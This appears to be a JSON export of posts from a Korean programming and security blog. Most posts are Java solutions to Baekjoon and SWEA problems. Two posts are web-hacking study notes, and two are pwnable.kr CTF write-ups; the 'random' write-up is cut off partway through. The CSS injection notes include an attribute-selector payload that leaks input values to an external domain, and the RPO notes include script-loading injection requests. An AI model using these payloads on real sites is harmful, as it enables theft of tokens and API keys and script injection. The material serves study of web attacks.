[{"content":"문제 오늘은 스타트링크에 다니는 사람들이 모여서 축구를 해보려고 한다. 축구는 평일 오후에 하고 의무 참석도 아니다. 축구를 하기 위해 모인 사람은 총 N명이고 신기하게도 N은 짝수이다. 이제 N/2명으로 이루어진 스타트 팀과 링크 팀으로 사람들을 나눠야 한다.\nBOJ를 운영하는 회사 답게 사람에게 번호를 1부터 N까지로 배정했고, 아래와 같은 능력치를 조사했다. 능력치 Sij는 i번 사람과 j번 사람이 같은 팀에 속했을 때, 팀에 더해지는 능력치이다. 팀의 능력치는 팀에 속한 모든 쌍의 능력치 Sij의 합이다. Sij는 Sji와 다를 수도 있으며, i번 사람과 j번 사람이 같은 팀에 속했을 때, 팀에 더해지는 능력치는 Sij와 Sji이다.\nN=4이고, S가 아래와 같은 경우를 살펴보자.\n   i\\j 1 2 3 4     1  1 2 3   2 4  5 6   3 7 1  2   4 3 4 5     예를 들어, 1, 2번이 스타트 팀, 3, 4번이 링크 팀에 속한 경우에 두 팀의 능력치는 아래와 같다.\n 스타트 팀: S12 + S21 = 1 + 4 = 5 링크 팀: S34 + S43 = 2 + 5 = 7 1, 3번이 스타트 팀, 2, 4번이 링크 팀에 속하면, 두 팀의 능력치는 아래와 같다. 스타트 팀: S13 + S31 = 2 + 7 = 9 링크 팀: S24 + S42 = 6 + 4 = 10 축구를 재미있게 하기 위해서 스타트 팀의 능력치와 링크 팀의 능력치의 차이를 최소로 하려고 한다. 위의 예제와 같은 경우에는 1, 4번이 스타트 팀, 2, 3번 팀이 링크 팀에 속하면 스타트 팀의 능력치는 6, 링크 팀의 능력치는 6이 되어서 차이가 0이 되고 이 값이 최소이다.  입력 첫째 줄에 N(4 ≤ N ≤ 20, N은 짝수)이 주어진다. 둘째 줄부터 N개의 줄에 S가 주어진다. 각 줄은 N개의 수로 이루어져 있고, i번 줄의 j번째 수는 Sij 이다. Sii는 항상 0이고, 나머지 Sij는 1보다 크거나 같고, 100보다 작거나 같은 정수이다.\n출력 첫째 줄에 스타트 팀과 링크 팀의 능력치의 차이의 최솟값을 출력한다.\n소스 import java.util.*; public class P14889 { static int[][] map; static boolean[] visited; static int N,min=Integer.MAX_VALUE; public static void main(String[] args) { Scanner sc = new Scanner(System.in); N = sc.nextInt(); map = new int[N][N]; visited = new boolean[N]; for(int i=0;i\u0026lt;N;i++) for(int j=0;j\u0026lt;N;j++) map[i][j]=sc.nextInt(); go(0,0); System.out.println(min); } static void go(int start,int depth) { if(depth==N/2) { int Ateam=0,Bteam=0; for(int i=0;i\u0026lt;N;i++) { if(visited[i]==true) { for(int j=0;j\u0026lt;N;j++) if(visited[j]==true) { if(i==j) continue; Ateam+=(map[i][j]); } }else for(int j=0;j\u0026lt;N;j++) if(visited[j]==false) { if(i==j) continue; Bteam+=(map[i][j]); } } min=Math.min(min, Math.abs(Ateam-Bteam)); return; }else { for(int i=start;i\u0026lt;N;i++) { if(visited[i]) continue; visited[i]=true; go(i+1,depth+1); visited[i]=false; } } } } 문제링크 https://www.acmicpc.net/problem/14889\n","date":"2023-01-02T20:57:38+09:00","permalink":"https://appealso.github.io/p/java-%EB%B0%B1%EC%A4%80-14889%EB%B2%88-%EC%8A%A4%ED%83%80%ED%8A%B8%EC%99%80-%EB%A7%81%ED%81%AC/","title":"[Java] 백준 14889번 스타트와 링크"},{"content":"문제 크기가 N×N인 지도가 있다. 지도의 각 칸에는 그 곳의 높이가 적혀져 있다.\n오늘은 이 지도에서 지나갈 수 있는 길이 몇 개 있는지 알아보려고 한다. 길이란 한 행 또는 한 열 전부를 나타내며, 한쪽 끝에서 다른쪽 끝까지 지나가는 것이다.\n다음과 같은 N=6인 경우 지도를 살펴보자.\n이때, 길은 총 2N개가 있으며, 아래와 같다.\n길을 지나갈 수 있으려면 길에 속한 모든 칸의 높이가 모두 같아야 한다. 또는, 경사로를 놓아서 지나갈 수 있는 길을 만들 수 있다. 경사로는 높이가 항상 1이며, 길이는 L이다. 또, 개수는 매우 많아 부족할 일이 없다. 경사로는 낮은 칸과 높은 칸을 연결하며, 아래와 같은 조건을 만족해야한다.\n 경사로는 낮은 칸에 놓으며, L개의 연속된 칸에 경사로의 바닥이 모두 접해야 한다. 낮은 칸과 높은 칸의 높이 차이는 1이어야 한다. 경사로를 놓을 낮은 칸의 높이는 모두 같아야 하고, L개의 칸이 연속되어 있어야 한다.  아래와 같은 경우에는 경사로를 놓을 수 없다.\n 경사로를 놓은 곳에 또 경사로를 놓는 경우 낮은 칸과 높은 칸의 높이 차이가 1이 아닌 경우 낮은 지점의 칸의 높이가 모두 같지 않거나, L개가 연속되지 않은 경우 경사로를 놓다가 범위를 벗어나는 경우  L = 2인 경우에 경사로를 놓을 수 있는 경우를 그림으로 나타내면 아래와 같다. 경사로를 놓을 수 없는 경우는 아래와 같다. 위의 그림의 가장 왼쪽부터 1번, 2번, 3번, 4번 예제라고 했을 때, 1번은 높이 차이가 1이 아니라서, 2번은 경사로를 바닥과 접하게 놓지 않아서, 3번은 겹쳐서 놓아서, 4번은 기울이게 놓아서 불가능한 경우이다.\n가장 위에 주어진 그림 예의 경우에 지나갈 수 있는 길은 초록색으로, 지나갈 수 없는 길은 빨간색으로 표시되어 있으며, 아래와 같다. 경사로의 길이 L = 2이다.\n지도가 주어졌을 때, 지나갈 수 있는 길의 개수를 구하는 프로그램을 작성하시오.\n입력 첫째 줄에 N (2 ≤ N ≤ 100)과 L (1 ≤ L ≤ N)이 주어진다. 둘째 줄부터 N개의 줄에 지도가 주어진다. 각 칸의 높이는 10보다 작거나 같은 자연수이다.\n출력 첫째 줄에 지나갈 수 있는 길의 개수를 출력한다.\n소스 import java.util.*; public class Main { static int count=0; static int N,L; static boolean slop[]; public static void main(String[] args) { Scanner sc = new Scanner(System.in); N = sc.nextInt(); L = sc.nextInt(); int[][] map = new int[N][N]; int[][] map2 = new int[N][N]; for(int i=0;i\u0026lt;N;i++) for(int j=0;j\u0026lt;N;j++) map[i][j]=map2[j][i]=sc.nextInt(); for(int i=0;i\u0026lt;N;i++) { go(i,map);go(i,map2); } System.out.println(count); } static void go(int i,int[][] map) { slop= new boolean[N]; for(int j=0;j\u0026lt;N-1;j++) if(map[i][j]!=map[i][j+1]) { int d = map[i][j]-map[i][j+1]; if(d!=1\u0026amp;\u0026amp;d!=-1) return; if(d==1) { for(int k=1;k\u0026lt;=L;k++) { if(j+k\u0026gt;=N||slop[j+k]) return; if(map[i][j]-1==map[i][j+k]) slop[j+k]=true; else return; } } else { for(int k=0;k\u0026lt;L;k++) { if(j-k\u0026lt;0||slop[j-k]) return; if(map[i][j]==map[i][j-k]) slop[j-k]=true; else return; } } } count++; } } 문제링크 https://www.acmicpc.net/problem/14890\n","date":"2023-01-02T20:52:50+09:00","permalink":"https://appealso.github.io/p/java-%EB%B0%B1%EC%A4%80-14890%EB%B2%88-%EA%B2%BD%EC%82%AC%EB%A1%9C/","title":"[Java] 백준 14890번 경사로"},{"content":"문제 총 8개의 톱니를 가지고 있는 톱니바퀴 4개가 아래 그림과 같이 일렬로 놓여져 있다. 또, 톱니는 N극 또는 S극 중 하나를 나타내고 있다. 톱니바퀴에는 번호가 매겨져 있는데, 가장 왼쪽 톱니바퀴가 1번, 그 오른쪽은 2번, 그 오른쪽은 3번, 가장 오른쪽 톱니바퀴는 4번이다.\n이때, 톱니바퀴를 총 K번 회전시키려고 한다. 톱니바퀴의 회전은 한 칸을 기준으로 한다. 회전은 시계 방향과 반시계 방향이 있고, 아래 그림과 같이 회전한다.\n톱니바퀴를 회전시키려면, 회전시킬 톱니바퀴와 회전시킬 방향을 결정해야 한다. 톱니바퀴가 회전할 때, 서로 맞닿은 극에 따라서 옆에 있는 톱니바퀴를 회전시킬 수도 있고, 회전시키지 않을 수도 있다. 톱니바퀴 A를 회전할 때, 그 옆에 있는 톱니바퀴 B와 서로 맞닿은 톱니의 극이 다르다면, B는 A가 회전한 방향과 반대방향으로 회전하게 된다. 예를 들어, 아래와 같은 경우를 살펴보자.\n두 톱니바퀴의 맞닿은 부분은 초록색 점선으로 묶여있는 부분이다. 여기서, 3번 톱니바퀴를 반시계 방향으로 회전했다면, 4번 톱니바퀴는 시계 방향으로 회전하게 된다. 2번 톱니바퀴는 맞닿은 부분이 S극으로 서로 같기 때문에, 회전하지 않게 되고, 1번 톱니바퀴는 2번이 회전하지 않았기 때문에, 회전하지 않게 된다. 따라서, 아래 그림과 같은 모양을 만들게 된다.\n위와 같은 상태에서 1번 톱니바퀴를 시계 방향으로 회전시키면, 2번 톱니바퀴가 반시계 방향으로 회전하게 되고, 2번이 회전하기 때문에, 3번도 동시에 시계 방향으로 회전하게 된다. 4번은 3번이 회전하지만, 맞닿은 극이 같기 때문에 회전하지 않는다. 따라서, 아래와 같은 상태가 된다.\n톱니바퀴의 초기 상태와 톱니바퀴를 회전시킨 방법이 주어졌을 때, 최종 톱니바퀴의 상태를 구하는 프로그램을 작성하시오.\n입력 첫째 줄에 1번 톱니바퀴의 상태, 둘째 줄에 2번 톱니바퀴의 상태, 셋째 줄에 3번 톱니바퀴의 상태, 넷째 줄에 4번 톱니바퀴의 상태가 주어진다. 상태는 8개의 정수로 이루어져 있고, 12시방향부터 시계방향 순서대로 주어진다. N극은 0, S극은 1로 나타나있다.\n다섯째 줄에는 회전 횟수 K(1 ≤ K ≤ 100)가 주어진다. 다음 K개 줄에는 회전시킨 방법이 순서대로 주어진다. 각 방법은 두 개의 정수로 이루어져 있고, 첫 번째 정수는 회전시킨 톱니바퀴의 번호, 두 번째 정수는 방향이다. 방향이 1인 경우는 시계 방향이고, -1인 경우는 반시계 방향이다.\n출력 총 K번 회전시킨 이후에 네 톱니바퀴의 점수의 합을 출력한다. 점수란 다음과 같이 계산한다.\n1번 톱니바퀴의 12시방향이 N극이면 0점, S극이면 1점\n2번 톱니바퀴의 12시방향이 N극이면 0점, S극이면 2점\n3번 톱니바퀴의 12시방향이 N극이면 0점, S극이면 4점\n4번 톱니바퀴의 12시방향이 N극이면 0점, S극이면 8점\n소스 import java.util.*; public class Main { static int[][] w = new int[4][8]; public static void main(String[] args) { Scanner sc = new Scanner(System.in); for(int i=0;i\u0026lt;4;i++) { String str = sc.nextLine(); for(int j=0;j\u0026lt;8;j++) w[i][j]=str.charAt(j)-48; } int K = sc.nextInt(); for(int i=0;i\u0026lt;K;i++) { int wn = sc.nextInt(); int r = sc.nextInt(); go(wn,r); } System.out.println(w[0][0]+w[1][0]*2+w[2][0]*4+w[3][0]*8); } static void go(int wn,int r) { boolean[] check = new boolean[4]; switch(wn) { case 1: int temp1=r; check[0]=true; for(int i=0;i\u0026lt;3;i++) if(w[i][2]!=w[i+1][6]) check[i+1]=true; else break; for(int i=0;i\u0026lt;4;i++) { if(check[i]) { r(i,temp1); temp1*=-1; } } break; case 2: int temp2=r; check[1]=true; if(w[1][6]!=w[0][2]) r(0,r*-1); for(int i=1;i\u0026lt;3;i++) if(w[i][2]!=w[i+1][6]) check[i+1]=true; else break; for(int i=1;i\u0026lt;4;i++) { if(check[i]) { r(i,temp2); temp2*=-1; } } break; case 3: int temp3=r; check[2]=true; if(w[2][2]!=w[3][6]) r(3,r*-1); for(int i=2;i\u0026gt;0;i--) if(w[i][6]!=w[i-1][2]) check[i-1]=true; else break; for(int i=3;i\u0026gt;=0;i--) { if(check[i]) { r(i,temp3); temp3*=-1; } } break; case 4: int temp4=r; check[3]=true; for(int i=3;i\u0026gt;0;i--) if(w[i][6]!=w[i-1][2]) check[i-1]=true; else break; for(int i=3;i\u0026gt;=0;i--) { if(check[i]) { r(i,temp4); temp4*=-1; }else break; } break; } } static void r(int wn,int r) { if(r==1) { int temp=w[wn][7]; for(int i=7;i\u0026gt;0;i--) w[wn][i]=w[wn][i-1]; w[wn][0]=temp; } else { int temp=w[wn][0]; for(int i=1;i\u0026lt;=7;i++) w[wn][i-1]=w[wn][i]; w[wn][7]=temp; } } } 문제링크 https://www.acmicpc.net/problem/14891\n","date":"2023-01-02T20:48:33+09:00","permalink":"https://appealso.github.io/p/java-%EB%B0%B1%EC%A4%80-14891%EB%B2%88-%ED%86%B1%EB%8B%88%EB%B0%94%ED%80%B4/","title":"[Java] 백준 14891번 톱니바퀴"},{"content":"문제 https://swexpertacademy.com/main/code/problem/problemDetail.do?contestProbId=AV5VwAr6APYDFAWu\u0026categoryId=AV5VwAr6APYDFAWu\u0026categoryType=CODE?\n코드 import java.util.*; public class Solution { static int[][] map; static boolean[][] visited; static boolean[] check; static int N,max,startx,starty; public static void main(String[] args) { Scanner sc = new Scanner(System.in); int T = sc.nextInt(); for(int t = 0;t\u0026lt;T;t++) { N = sc.nextInt(); map = new int[N][N]; visited = new boolean[N][N]; check = new boolean[101]; for(int i=0;i\u0026lt;N;i++) for(int j=0;j\u0026lt;N;j++) map[i][j]=sc.nextInt(); max = -1; for(int i=0;i\u0026lt;N;i++) { for(int j=0;j\u0026lt;N;j++) { startx=i; starty=j; go(i,j,0); } } System.out.println(\u0026#34;#\u0026#34;+(t+1)+\u0026#34; \u0026#34;+max); } } static void go(int movex,int movey,int dir) { check[map[movex][movey]]=true; if(dir==4\u0026amp;\u0026amp;startx==movex\u0026amp;\u0026amp;starty==movey) { int cnt=0; for(int i=0;i\u0026lt;101;i++) if(check[i]) cnt++; if(cnt%2!=0) return; if(cnt\u0026gt;max) max=cnt; check[map[movex][movey]]=false; }else { if(dir==0) { if(movex+1\u0026lt;N\u0026amp;\u0026amp;movey+1\u0026lt;N\u0026amp;\u0026amp;!check[map[movex+1][movey+1]]) go(movex+1,movey+1,1); } else if(dir==1) { if(movex+1\u0026lt;N\u0026amp;\u0026amp;movey+1\u0026lt;N\u0026amp;\u0026amp;!check[map[movex+1][movey+1]]) go(movex+1,movey+1,1); if(movex+1\u0026lt;N\u0026amp;\u0026amp;movey-1\u0026gt;=0\u0026amp;\u0026amp;!check[map[movex+1][movey-1]]) go(movex+1,movey-1,2); } else if(dir==2) { if(movex+1\u0026lt;N\u0026amp;\u0026amp;movey-1\u0026gt;=0\u0026amp;\u0026amp;!check[map[movex+1][movey-1]]) go(movex+1,movey-1,2); if(movex-1\u0026gt;=0\u0026amp;\u0026amp;movey-1\u0026gt;=0\u0026amp;\u0026amp;!check[map[movex-1][movey-1]]) go(movex-1,movey-1,3); }else if(dir==3) { if(movex-1\u0026gt;=0\u0026amp;\u0026amp;movey-1\u0026gt;=0\u0026amp;\u0026amp;!check[map[movex-1][movey-1]]) go(movex-1,movey-1,3); if(startx==movex-1\u0026amp;\u0026amp;starty==movey+1) go(movex-1,movey+1,4); else { if(movex-1\u0026gt;=0\u0026amp;\u0026amp;movey+1\u0026lt;N\u0026amp;\u0026amp;!check[map[movex-1][movey+1]]) go(movex-1,movey+1,4); } }else { if(startx==movex-1\u0026amp;\u0026amp;starty==movey+1) go(movex-1,movey+1,4); else { if(movex-1\u0026gt;=0\u0026amp;\u0026amp;movey+1\u0026lt;N\u0026amp;\u0026amp;!check[map[movex-1][movey+1]]) go(movex-1,movey+1,4); } } } check[map[movex][movey]]=false; } } ","date":"2023-01-02T20:46:21+09:00","permalink":"https://appealso.github.io/p/java-swea-2105-%EB%94%94%EC%A0%80%ED%8A%B8-%EC%B9%B4%ED%8E%98/","title":"[Java] swea 2105 디저트 카페"},{"content":"CSS Injection?  CSS Injection은 악의적인 문자열을 삽입하여 악의적인 동작을 이끄공격 CSS 속성을 삽입해 웹페이지의 UI (생김새)를 변조하거나 CSS 속성의 다양한 기능을 통해 웹 페이지내의 데이터를 외부로 훔치는 기술  데이터의 예로는 CSRF Token, 피해자의 API Key등 웹 페이지에 직접적으로 보여지는 값처럼 CSS 선택자를 통해 표현이 가능해야 합니다. 그래서 CSS 선택자로 표현이 불가능한 “script” 태그 내 데이터들은 탈취할 수 없습니다.\n1. 외부 URL 호출  HTTPLeaks 가젯이용: https://github.com/cure53/HTTPLeaks/blob/main/leak.html#L266 대표적 예시     CSS 가젯 설명     @import \u0026lsquo;https://leaking.via/css-import-string'; 외부 CSS 파일을 로드합니다. 모든 속성 중 가장 상단에 위치해야합니다. 그렇지 않을 경우 @import는 무시됩니다.   @import url(https://leaking.via/css-import-url); url 함수는 URL를 불러오는 역할을 합니다. 상황에 따라서 선택적으로 사용할 수 있습니다.   background: url(https://leaking.via/css-background); 요소의 배경을 변경할 때 사용할 이미지를 불러옵니다.   @font-face { font-family: leak;src: url(https://leaking.via/css-font-face-src);} 불러올 폰트 파일의 주소를 지정합니다.   background-image: \\000075\\000072\\00006C(https://leaking.via/css-escape-url-2); CSS 에서 함수를 호출할 때 ascii형태의 “url”이 아닌 hex형태인 “\\000075\\000072\\00006C”도 지원합니다.    2. CSS Attribute Selector을 활용한 데이터 탈취    구문 설명     [attr] attr 이라는 이름의 특성을 가진 요소를 선택합니다.   [attr=value] attr 이라는 이름의 특성값이 정확히 value인 요소를 선택합니다.   [attr~=value] attr이라는 이름의 특성값이 정확히 value인 요소를 선택합니다. attr 특성은 공백으로 구분한 여러 개의 값을 가지고 있을 수 있습니다.   [attr^=value] attr이라는 특성값을 가지고 있으며, 접두사로 value가 값에 포함되어 있으면 이 요소를 선택합니다.   [attr$=value] attr이라는 특성값을 가지고 있으며, 접미사로 value가 값에 포함되어 있으면 이 요소를 선택합니다.    예시 /* inputdml value가 지정한 알파뱃으로 시작할때 get requeust 호출 */ input[value^=\u0026#34;a\u0026#34;] { background: url(\u0026#39;http://ourdomain.com/?char1=a\u0026#39;); } input[value^=\u0026#34;b\u0026#34;] { background: url(\u0026#39;http://ourdomain.com/?char1=b\u0026#39;); } ... input[value^=\u0026#34;z\u0026#34;] { background: url(\u0026#39;http://ourdomain.com/?char1=z\u0026#39;); } 출처 https://learn.dreamhack.io/327\nhttps://velog.io/@hunjison/CSS-Injection\n","date":"2022-12-05T20:04:14+09:00","image":"https://appealso.github.io/p/web-hacking-css-injection/security_hua86146557b2012f829fdc26a39bf75dc_509252_120x120_fill_q75_box_smart1.jpg","permalink":"https://appealso.github.io/p/web-hacking-css-injection/","title":"[WEB Hacking] CSS injection"},{"content":"Relative Path Overwrite? Relative Path Overwrite (RPO)는 일반적으로 서버와 브라우저가 상대 경로를 해석하는 과정에서 발생하는 차이점을 이용한 공격 임포트 하는 페이지를 조작할 수 있으면, 공격자가 의도한 자바스크립트, 스타일 시트 코드를 로드 시킬수 있음\n\u0026lt;script src=\u0026#34;/app/main.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;app/main.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 위의 스크립트를 로드할떄 https://test/main.php에 접속하여 로드할 경우 첫번째 스크립트는 https://test/app/main.js를 로드하지만 두번째 스크립트는 https://test/main.php/app/main.js를 로드 함\nJavaScript 예시  예를 들어 공격자가 RPO 취약점을 통해 원래 /static/script.js 로 로드되어야 할 파일을 /userinput/static/script.js의 형태로 로드할 수 있다고 가정 서버에서 /userinput/static/script.js not found.와 같이 반환한다면 XSS 공격이 가능 이 경우 공격자는 userinput 부분을 조작하여 index.php/;alert(1);//static/script.js와 같은 형태로 경로를 구성한다면 해당 내용이 script 태그의 src로 들어가 alert(1); 이라는 코드를 실행하는 것이 가능 여기서 앞 부분 \u0026lsquo;/\u0026lsquo;과 뒷 부분 \u0026lsquo;//'(주석)은 자바스크립트에서 문법 에러를 발생시키지 않도록 하기 위해 넣어둔 것  Path traversal 예시 [Request] GET /page?link=../../../upload/my_script.js [Response] ... \u0026lt;script src=\u0026quot;asset/js/vendor/../../../upload/my_script.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; ... Ptorocol-relative URL 예시 [Request] GET /page?test=//www.hahwul.com/xss.js [Response] ... \u0026lt;script src=\u0026quot;//www.hahwul.com/xss.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; ... 참고 https://learn.dreamhack.io/328#4\nhttps://www.hahwul.com/cullinan/rpo/\n","date":"2022-12-05T20:04:14+09:00","image":"https://appealso.github.io/p/web-hacking-relative-path-overwrite/security_hua86146557b2012f829fdc26a39bf75dc_509252_120x120_fill_q75_box_smart1.jpg","permalink":"https://appealso.github.io/p/web-hacking-relative-path-overwrite/","title":"[WEB Hacking] Relative Path OverWrite"},{"content":"문제를 접속하면 아래의 파일이 주어진다. 우선 c파일을 열어보자. 열어보면 총 5개의 stage를 넘어가야하는데. 입력값을 코드에 맞춰 넘겨주면 된다. 각 스테이지 별로 분석을 해보자.\ninput2@pwnable:~$ ls flag input input.c input2@pwnable:~$ cat input.c #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;string.h\u0026gt;#include \u0026lt;sys/socket.h\u0026gt;#include \u0026lt;arpa/inet.h\u0026gt; int main(int argc, char* argv[], char* envp[]){ printf(\u0026#34;Welcome to pwnable.kr\\n\u0026#34;); printf(\u0026#34;Let\u0026#39;s see if you know how to give input to program\\n\u0026#34;); printf(\u0026#34;Just give me correct inputs then you will get the flag :)\\n\u0026#34;); // argv \tif(argc != 100) return 0; if(strcmp(argv[\u0026#39;A\u0026#39;],\u0026#34;\\x00\u0026#34;)) return 0; if(strcmp(argv[\u0026#39;B\u0026#39;],\u0026#34;\\x20\\x0a\\x0d\u0026#34;)) return 0; printf(\u0026#34;Stage 1 clear!\\n\u0026#34;); // stdio \tchar buf[4]; read(0, buf, 4); if(memcmp(buf, \u0026#34;\\x00\\x0a\\x00\\xff\u0026#34;, 4)) return 0; read(2, buf, 4); if(memcmp(buf, \u0026#34;\\x00\\x0a\\x02\\xff\u0026#34;, 4)) return 0; printf(\u0026#34;Stage 2 clear!\\n\u0026#34;); // env \tif(strcmp(\u0026#34;\\xca\\xfe\\xba\\xbe\u0026#34;, getenv(\u0026#34;\\xde\\xad\\xbe\\xef\u0026#34;))) return 0; printf(\u0026#34;Stage 3 clear!\\n\u0026#34;); // file \tFILE* fp = fopen(\u0026#34;\\x0a\u0026#34;, \u0026#34;r\u0026#34;); if(!fp) return 0; if( fread(buf, 4, 1, fp)!=1 ) return 0; if( memcmp(buf, \u0026#34;\\x00\\x00\\x00\\x00\u0026#34;, 4) ) return 0; fclose(fp); printf(\u0026#34;Stage 4 clear!\\n\u0026#34;); // network \tint sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1){ printf(\u0026#34;socket error, tell admin\\n\u0026#34;); return 0; } saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons( atoi(argv[\u0026#39;C\u0026#39;]) ); if(bind(sd, (struct sockaddr*)\u0026amp;saddr, sizeof(saddr)) \u0026lt; 0){ printf(\u0026#34;bind error, use another port\\n\u0026#34;); return 1; } listen(sd, 1); int c = sizeof(struct sockaddr_in); cd = accept(sd, (struct sockaddr *)\u0026amp;caddr, (socklen_t*)\u0026amp;c); if(cd \u0026lt; 0){ printf(\u0026#34;accept error, tell admin\\n\u0026#34;); return 0; } if( recv(cd, buf, 4, 0) != 4 ) return 0; if(memcmp(buf, \u0026#34;\\xde\\xad\\xbe\\xef\u0026#34;, 4)) return 0; printf(\u0026#34;Stage 5 clear!\\n\u0026#34;); // here\u0026#39;s your flag \tsystem(\u0026#34;/bin/cat flag\u0026#34;); return 0; } 우선 stage1 을 보면 아래와 같다.\n// argv \tif(argc != 100) return 0; if(strcmp(argv[\u0026#39;A\u0026#39;],\u0026#34;\\x00\u0026#34;)) return 0; if(strcmp(argv[\u0026#39;B\u0026#39;],\u0026#34;\\x20\\x0a\\x0d\u0026#34;)) return 0; printf(\u0026#34;Stage 1 clear!\\n\u0026#34;); 인자가 100개이고, A,B번째 인자가 \u0026ldquo;\\x00\u0026rdquo;, \u0026ldquo;\\x20\\x0a\\x0d\u0026rdquo; 이어야한다.\n다음으로 stage2를 보면 다음과 같다.\nchar buf[4]; read(0, buf, 4); if(memcmp(buf, \u0026#34;\\x00\\x0a\\x00\\xff\u0026#34;, 4)) return 0; read(2, buf, 4); if(memcmp(buf, \u0026#34;\\x00\\x0a\\x02\\xff\u0026#34;, 4)) return 0; printf(\u0026#34;Stage 2 clear!\\n\u0026#34;); stdin에서 4바이트를 읽어와서 내용이 \\x00\\x0a\\x00\\xff인지 확인하고 stderr에서 4바이트를 읽어와서 내용이 \\x00\\x0a\\x02\\xff이어야 한다.\n다음으로 stage3을 보자.\nif(strcmp(\u0026#34;\\xca\\xfe\\xba\\xbe\u0026#34;, getenv(\u0026#34;\\xde\\xad\\xbe\\xef\u0026#34;))) return 0; printf(\u0026#34;Stage 3 clear!\\n\u0026#34;); 환경변수의 값을 \\xca\\xfe\\xba\\xbe로 지정해야한다.\n다음으로 stage4를 보자.\nFILE* fp = fopen(\u0026#34;\\x0a\u0026#34;, \u0026#34;r\u0026#34;); if(!fp) return 0; if( fread(buf, 4, 1, fp)!=1 ) return 0; if( memcmp(buf, \u0026#34;\\x00\\x00\\x00\\x00\u0026#34;, 4) ) return 0; fclose(fp); printf(\u0026#34;Stage 4 clear!\\n\u0026#34;); \\x0a라는 파일에 4방비트를 \\x00으로 채워야 한다.\n마지막으로 stage5를 보자\nint sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1){ printf(\u0026#34;socket error, tell admin\\n\u0026#34;); return 0; } saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons( atoi(argv[\u0026#39;C\u0026#39;]) ); if(bind(sd, (struct sockaddr*)\u0026amp;saddr, sizeof(saddr)) \u0026lt; 0){ printf(\u0026#34;bind error, use another port\\n\u0026#34;); return 1; } listen(sd, 1); int c = sizeof(struct sockaddr_in); cd = accept(sd, (struct sockaddr *)\u0026amp;caddr, (socklen_t*)\u0026amp;c); if(cd \u0026lt; 0){ printf(\u0026#34;accept error, tell admin\\n\u0026#34;); return 0; } if( recv(cd, buf, 4, 0) != 4 ) return 0; if(memcmp(buf, \u0026#34;\\xde\\xad\\xbe\\xef\u0026#34;, 4)) return 0; printf(\u0026#34;Stage 5 clear!\\n\u0026#34;); 해당 코드를 해석해 보면 argv[\u0026lsquo;C\u0026rsquo;]에서 포트를 주고, \\xde\\xad\\xbe\\xef를 입력하면 되는 것을 알 수 있다. 이제 이걸 모아서 아래와 같은 exploit코드를 작성하고 실행 해주면 flag를 획득 할 수 있다.\n flag파일이 없기 때문에 \u0026lsquo;ln -s /home/input2/flag flag\u0026rsquo; 실행하여 링크 파일을 만들어 주어야 한다.  from pwn import * argv_ans = [str(i) for i in range(100)] argv_ans[ord(\u0026#39;A\u0026#39;)] = \u0026#39;\\x00\u0026#39; argv_ans[ord(\u0026#39;B\u0026#39;)] = \u0026#39;\\x20\\x0a\\x0d\u0026#39; with open(\u0026#39;./stderr\u0026#39;, \u0026#39;a\u0026#39;) as f: f.write(\u0026#39;\\x00\\x0a\\x02\\xff\u0026#39;); env_ans = {\u0026#39;\\xde\\xad\\xbe\\xef\u0026#39;:\u0026#39;\\xca\\xfe\\xba\\xbe\u0026#39;} with open(\u0026#39;./\\x0a\u0026#39;,\u0026#39;a\u0026#39;) as f: f.write(\u0026#39;\\x00\\x00\\x00\\x00\u0026#39;) argv_ans[ord(\u0026#39;C\u0026#39;)] = \u0026#39;9999\u0026#39; target = process(executable=\u0026#39;/home/input2/input\u0026#39;,argv=argv_ans,stderr=open(\u0026#39;./stderr\u0026#39;),env=env_ans) target.sendline(\u0026#39;\\x00\\x0a\\x00\\xff\u0026#39;) local = remote(\u0026#39;localhost\u0026#39;,\u0026#39;9999\u0026#39;) local.send(\u0026#39;\\xde\\xad\\xbe\\xef\u0026#39;) target.interactive() input2@pwnable:/tmp/iptest$ python exploit.py [+] Starting local process \u0026#39;/home/input2/input\u0026#39;: pid 5668 [+] Opening connection to localhost on port 9999: Done [*] Switching to interactive mode Welcome to pwnable.kr Let\u0026#39;s see if you know how to give input to program Just give me correct inputs then you will get the flag :) Stage 1 clear! Stage 2 clear! Stage 3 clear! Stage 4 clear! Stage 5 clear! Mommy! I learned how to pass various input in Linux :) ","date":"2022-10-26T17:08:44+09:00","image":"https://appealso.github.io/p/pwnable.kr-input/pwn_hu894f602aab8ef4f7b7afefcfbc650dba_71661_120x120_fill_box_smart1_3.png","permalink":"https://appealso.github.io/p/pwnable.kr-input/","title":"pwnable.kr input"},{"content":"Write-up 처음 접속을 하면 아래의 코드가 주어진다. 코드를 해석해보면 key와 random을 xor연산하여 0xdeadbeef 와 값이 동일하면 플래그가 출력되도록 되어있다.\nrandom@pwnable:~$ ls flag random random.c random@pwnable:~$ cat random.c #include \u0026lt;stdio.h\u0026gt; int main(){ unsigned int random; random = rand();\t// random value!  unsigned int key=0; scanf(\u0026#34;%d\u0026#34;, \u0026amp;key); if( (key ^ random) == 0xdeadbeef ){ // key random이랑 xor 연산 \tprintf(\u0026#34;Good!\\n\u0026#34;); system(\u0026#34;/bin/cat flag\u0026#34;); return 0; } printf(\u0026#34;Wrong, maybe you should try 2^32 cases.\\n\u0026#34;); return 0; } 이제 디컴파일을 하여 코드를 확인해보자. DWORD PTR [rbp-0x4],eax에 랜덤값을 생성하여 변수에 삽입하는 것을 알 수 있다.\n(gdb) set disassembly-flavor intel (gdb) disas main Dump of assembler code for function main: 0x00000000004005f4 \u0026lt;+0\u0026gt;:\tpush rbp 0x00000000004005f5 \u0026lt;+1\u0026gt;:\tmov rbp,rsp 0x00000000004005f8 \u0026lt;+4\u0026gt;:\tsub rsp,0x10 0x00000000004005fc \u0026lt;+8\u0026gt;:\tmov eax,0x0 0x0000000000400601 \u0026lt;+13\u0026gt;:\tcall 0x400500 \u0026lt;rand@plt\u0026gt; 0x0000000000400606 \u0026lt;+18\u0026gt;:\tmov DWORD PTR [rbp-0x4],eax 